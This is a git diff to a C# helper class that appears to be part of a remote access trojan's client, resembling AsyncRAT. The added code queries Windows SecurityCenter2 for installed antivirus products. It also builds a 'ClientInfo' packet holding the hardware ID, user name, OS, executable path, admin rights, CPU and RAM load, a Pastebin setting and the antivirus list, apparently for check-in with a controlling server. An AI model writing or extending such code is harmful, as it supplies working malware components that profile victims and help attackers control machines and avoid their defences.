@@ -1,6 +1,11 @@
-﻿using Client.Sockets;
+﻿using Client.MessagePack;
+using Client.Sockets;
+using Microsoft.VisualBasic.Devices;
 using System;
+using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
+using System.Management;
 using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Security.Principal;
@@ -11,6 +16,9 @@ namespace Client.Helper
 {
    static class Methods
     {
+        public static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+        public static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");
+
         public static string HWID()
         {
             StringBuilder sb = new StringBuilder();
@@ -65,6 +73,38 @@ namespace Client.Helper
                 ClientSocket.Client?.Close();
             }
             catch { }
+        }
+
+        public static string Antivirus()
+        {
+            using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
+            {
+                List<string> av = new List<string>();
+                foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
+                {
+                    av.Add(searchResult["displayName"].ToString());
+                }
+                if (av.Count == 0) return "None";
+                return string.Join(", ", av.ToArray());
+            }
+        }
+
+        public static byte[] SendInfo()
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
+            msgpack.ForcePathObject("HWID").AsString = HWID();
+            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
+            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
+                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
+            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
+            msgpack.ForcePathObject("Version").AsString = Settings.Version;
+            msgpack.ForcePathObject("Admin").AsString = IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
+            TheCPUCounter.NextValue();
+            msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
+            msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
+            msgpack.ForcePathObject("Antivirus").AsString = Antivirus();
+            return msgpack.Encode2Bytes();
         }
     }
 }
